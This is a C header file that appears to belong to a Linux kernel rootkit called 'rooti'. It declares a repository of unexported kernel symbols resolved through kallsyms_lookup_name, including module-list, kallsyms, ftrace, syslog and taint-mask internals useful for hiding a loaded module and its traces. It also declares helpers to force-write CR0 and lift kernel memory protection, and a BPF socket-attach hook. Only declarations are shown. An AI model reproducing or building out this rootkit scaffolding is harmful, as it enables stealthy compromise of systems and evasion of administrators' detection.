#ifndef _ROOTI_UTILS_H
#define _ROOTI_UTILS_H

#include <linux/printk.h>
#include <linux/mutex_types.h>
#include <linux/notifier.h>
#include <linux/seq_file.h>
#include <linux/bpf.h>
#include <linux/module.h>
#include <net/sock.h>

#ifdef ROOTI_DEBUG_LOGGING
#define ROOTI_DEBUG(fmt, ...) printk(KERN_DEBUG "rooti: " fmt "\n", ##__VA_ARGS__)
#else
#define ROOTI_DEBUG(fmt, ...) ((void)0)
#endif

// On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'.
#ifdef CONFIG_X86_64
#define ROOTI_SYSCALL_NAME(name) ("__x64_" name)
#else
#define ROOTI_SYSCALL_NAME(name) (name)
#endif

/*
    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the
    calculation to a constant variable because the linux macro includes some magic __must_be_array()
    term to catch invalid use of the macro, thus making the expression not constant.
*/
#define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
#define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)

struct rooti_sym_repo {
    unsigned long (*kallsyms_lookup_name)(const char *);

    unsigned long *tainted_mask;
    struct seq_operations *kallsyms_op;
    struct seq_operations *show_ftrace_seq_ops;
    struct mutex *module_mutex;
    struct blocking_notifier_head *module_notify_list;

    int (*do_syslog)(int, char *, int, int);
    void (*mod_sysfs_teardown)(struct module *);
    void (*module_arch_cleanup)(struct module *);
    void (*module_unload_free)(struct module *);
    void (*module_destroy_params)(const struct kernel_param *, unsigned);
    void (*mod_tree_remove)(struct module *);
    void (*module_bug_cleanup)(struct module *);
    void (*module_arch_freeing_init)(struct module *);
   	void (*klp_module_going)(struct module *);
	void (*ftrace_release_mod)(struct module *);
	int (*__sk_attach_prog)(struct bpf_prog *, struct sock *);
};

extern struct rooti_sym_repo rooti_sym_repo;

int rooti_resolve_unexported_syms(void);

inline void rooti_force_write_cr0(unsigned long val);
inline void rooti_unprotect_memory(void);
inline void rooti_protect_memory(void);

#endif
